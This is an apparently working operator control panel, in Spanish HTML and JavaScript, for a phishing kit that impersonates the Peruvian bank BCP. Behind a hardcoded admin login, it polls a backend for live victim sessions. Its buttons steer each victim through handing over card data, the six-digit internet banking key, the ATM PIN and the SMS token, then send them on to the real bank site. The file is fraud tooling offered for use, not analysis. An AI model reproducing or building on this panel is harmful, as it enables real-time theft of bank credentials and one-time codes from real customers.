<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel de Control - BCP v4.1</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0e11; color: #e9eaeb; padding: 20px; }
        .container { max-width: 1000px; margin: auto; display: none; } 
        
        /* Estilos del Login */
        #login-screen {
            height: 80vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-card {
            background: #1e2329;
            padding: 40px;
            border-radius: 12px;
            border: 1px solid #333;
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        .login-card h2 { color: #ff7800; margin-bottom: 25px; }
        .login-card input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            background: #0b0e11;
            border: 1px solid #444;
            color: white;
            border-radius: 6px;
            outline: none;
            box-sizing: border-box;
        }
        .login-card input:focus { border-color: #ff7800; }
        .btn-login {
            width: 100%;
            background: #ff7800;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
        }

        /* Estilos del Panel */
        h1 { border-bottom: 2px solid #ff7800; padding-bottom: 10px; color: #ff7800; font-size: 24px; }
        .user-card { 
            background: #1e2329; border-radius: 12px; padding: 20px; margin-bottom: 20px;
            display: flex; flex-direction: column; gap: 15px; border: 1px solid #333; position: relative;
        }
        .status-badge {
            position: absolute; top: 20px; right: 20px; padding: 5px 12px; border-radius: 20px; 
            font-size: 11px; font-weight: bold; text-transform: uppercase;
        }
        .st-espera { background: #f0b90b; color: #000; }
        .st-visitando { background: #5e6673; color: #fff; }
        .st-online { background: #2ebd85; color: #fff; }
        .info { font-size: 14px; }
        .info b { color: #ff7800; font-size: 18px; }
        .action-group { display: flex; flex-wrap: wrap; gap: 10px; border-top: 1px solid #333; padding-top: 15px; }
        .section-title { width: 100%; font-size: 11px; color: #848e9c; margin-bottom: 5px; text-transform: uppercase; font-weight: bold; }
        
        button { padding: 10px 16px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 12px; text-transform: uppercase; }
        
        .btn-bcp { background: #002a8d; color: white; }
        .btn-red { background: #f6465d; color: white; }
        .btn-green { background: #2ebd85; color: white; }
        .btn-orange { background: #ff7800; color: white; }
        .btn-internet { background: #002a8d; color: #fff; border: 1px solid #00aae4; }
        
        button:hover { opacity: 0.8; transform: translateY(-1px); }
    </style>
</head>
<body>

    <div id="login-screen">
        <div class="login-card">
            <h2>Acceso Staff</h2>
            <input type="text" id="user" placeholder="Usuario">
            <input type="password" id="pass" placeholder="Contraseña">
            <button class="btn-login" onclick="validarAcceso()">ENTRAR AL PANEL</button>
            <p id="error-msg" style="color: #f6465d; font-size: 12px; margin-top: 10px; display: none;">Credenciales incorrectas</p>
        </div>
    </div>

    <div class="container" id="admin-panel">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h1>BCP - CONTROL DE ACCESOS</h1>
            <button onclick="cerrarSesion()" style="background: transparent; color: #848e9c; border: 1px solid #444;">Cerrar Sesión</button>
        </div>
        <div id="lista-usuarios">Esperando conexiones del servidor...</div>
    </div>

    <script>
        const USER_AUTH = "admin";    
        const PASS_AUTH = "Menteloca12";   

        function validarAcceso() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            if (u === USER_AUTH && p === PASS_AUTH) {
                sessionStorage.setItem('auth', 'true');
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('admin-panel').style.display = 'block';
                iniciarPanel();
            } else {
                document.getElementById('error-msg').style.display = 'block';
            }
        }

        function cerrarSesion() {
            sessionStorage.removeItem('auth');
            location.reload();
        }

        if (sessionStorage.getItem('auth') === 'true') {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('admin-panel').style.display = 'block';
            iniciarPanel();
        }

        function iniciarPanel() {
            cargarUsuarios();
            setInterval(cargarUsuarios, 3000);
        }

        function cargarUsuarios() {
            if (sessionStorage.getItem('auth') !== 'true') return;

            fetch('api.php?accion=listar')
                .then(res => res.json())
                .then(data => {
                    let html = '';
                    for (let id in data) {
                        const estado = data[id];
                        html += `
                        <div class="user-card">
                            <div class="status-badge st-${estado}">${estado}</div>
                            <div class="info">
                                <span>SESIÓN: <b>${id}</b></span>
                            </div>
                            
                            <div class="action-group">
                                <div class="section-title">1. Validación Inicial (Tarjeta / DNI)</div>
                                <button class="btn-red" onclick="cambiar('${id}', 'error_login')">DATOS DE TARJETA MALOS</button>
                                <button class="btn-green" onclick="cambiar('${id}', 'pedir_internet')">DATOS OK -> PEDIR INTERNET (6)</button>
                                <button class="btn-orange" onclick="cambiar('${id}', 'pedir_clave')">DATOS OK -> PEDIR CAJERO (4)</button>
                            </div>

                            <div class="action-group">
                                <div class="section-title">2. Errores de Claves</div>
                                <button class="btn-red" onclick="cambiar('${id}', 'error_internet')">Clave Internet INCORRECTA</button>
                                <button class="btn-red" onclick="cambiar('${id}', 'error_clave')">Clave Cajero INCORRECTA</button>
                                <button class="btn-red" onclick="cambiar('${id}', 'error_token')">Token INCORRECTO</button>
                            </div>

                            <div class="action-group">
                                <div class="section-title">3. Verificación Adicional (SMS/Token)</div>
                                <button class="btn-bcp" onclick="cambiar('${id}', 'pedir_token')">Pedir Token (5)</button>
                            </div>

                            <div class="action-group">
                                <div class="section-title">4. Finalización</div>
                                <button class="btn-green" onclick="cambiar('${id}', 'ok')" style="border: 2px solid white;">FINALIZAR Y ENVIAR A WEB REAL</button>
                            </div>
                        </div>`;
                    }
                    document.getElementById('lista-usuarios').innerHTML = html || "Sin actividad reciente.";
                });
        }

        function cambiar(id, nuevoEstado) {
            fetch('api.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id_usuario: id, estado: nuevoEstado })
            }).then(() => cargarUsuarios());
        }
    </script>
</body>
</html>